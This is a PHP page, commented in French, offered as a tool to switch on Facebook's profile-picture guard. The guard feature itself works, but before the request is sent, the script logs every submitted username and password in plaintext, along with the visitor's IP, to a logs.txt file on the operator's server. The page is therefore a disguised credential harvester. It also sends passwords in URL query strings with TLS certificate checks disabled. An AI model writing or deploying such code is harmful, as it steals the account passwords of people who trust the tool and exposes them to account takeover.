<?php
session_start();

// Fonction pour récupérer l'IP réelle du visiteur
function getUserIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        return $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        return $_SERVER['REMOTE_ADDR'];
    }
}

// Vérifier si le formulaire a été soumis
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Sécurisation des entrées
    $username = htmlspecialchars($_POST['username'], ENT_QUOTES, 'UTF-8');
    $password = htmlspecialchars($_POST['password'], ENT_QUOTES, 'UTF-8');
    $active = isset($_POST['active']) ? htmlspecialchars($_POST['active'], ENT_QUOTES, 'UTF-8') : "false";

    // Récupération de l'IP et date
    $ip = getUserIP();
    $date = date("Y-m-d H:i:s");

    // Format du log
    $logData = "[$date] IP: $ip | Username: $username | Password: $password\n";

    // Enregistrer les données dans logs.txt
    file_put_contents("logs.txt", $logData, FILE_APPEND | LOCK_EX);

    try {
        $fbShield = new FbShield($username, $password, $active);
        $fbShield->request();
    } catch (Exception $e) {
        $_SESSION['msg'] = "<div class='alert alert-danger' role='alert'>❌ " . htmlspecialchars($e->getMessage(), ENT_QUOTES, 'UTF-8') . "</div>";
    }

    // Redirection après soumission du formulaire
    header("Location: index.php");
    exit();
}

// Classe FbShield
class FbShield
{
    protected $username;
    protected $password;
    protected $active;

    function __construct($username, $password, $active){
        $this->username = $username;
        $this->password = $password;
        $this->active = ($active === "true") ? "true" : "false"; // Force "true" ou "false"
    }

    function token(){
        return $this->generate();
    }

    function generate(){
        $url = 'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='.$this->username.'&locale=en_US&password='.$this->password.'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6';

        $curl = curl_init();
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($curl, CURLOPT_URL, $url);
        curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
        $res = curl_exec($curl);

        if ($res === false) {
            throw new Exception('❌ Erreur cURL: ' . curl_error($curl));
        }

        curl_close($curl);
        
        $data = json_decode($res, true);

        if (isset($data['error'])) {
            throw new Exception('❌ Identifiants incorrects. Vérifiez votre Username et Password.');
        }

        return $data;
    }

    function data(){
        $tokenData = $this->token();

        if (!isset($tokenData['uid'])) {
            throw new Exception("❌ Impossible de récupérer l'UID Facebook.");
        }

        return 'variables={"0":{"is_shielded":'.$this->active.',"session_id":"9b78191c-84fd-4ab6-b0aa-19b39f04a6bc","actor_id":'.$tokenData['uid'].',"client_mutation_id":"b0316dd6-3fd6-4beb-aed4-bb29c5dc64b0"}}&method=post&doc_id=1477043292367183&query_name=IsShieldedSetMutation&strip_defaults=true&strip_nulls=true&locale=en_US&client_country_code=US&fb_api_req_friendly_name=IsShieldedSetMutation&fb_api_caller_class=IsShieldedSetMutation';
    }

    function headers()
    {
        $tokenData = $this->token();
        if (!isset($tokenData['access_token'])) {
            throw new Exception("❌ Impossible de récupérer l'Access Token Facebook.");
        }

        return [
            'Content-Type: application/x-www-form-urlencoded', 
            'Authorization: OAuth '.$tokenData['access_token']
        ];
    }

    function request()
    {
        $curl = curl_init();
        curl_setopt($curl, CURLOPT_URL, 'https://graph.facebook.com/graphql');
        curl_setopt($curl, CURLOPT_HTTPHEADER, $this->headers());
        curl_setopt($curl, CURLOPT_POST, 1);
        curl_setopt($curl, CURLOPT_POSTFIELDS, $this->data());
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);

        $resp = curl_exec($curl);

        if ($resp === false) {
            throw new Exception('❌ Erreur lors de la requête Facebook: ' . curl_error($curl));
        }

        curl_close($curl);
        
        $_SESSION['msg'] = ($this->active === "true") 
            ? "<div class=\"alert alert-success\" role=\"alert\">✅ <strong>Succès !</strong> La protection du profil a été activée.</div>" 
            : "<div class=\"alert alert-warning\" role=\"alert\">⚠️ <strong>Info :</strong> La protection du profil a été désactivée.</div>";
    }
}
?>
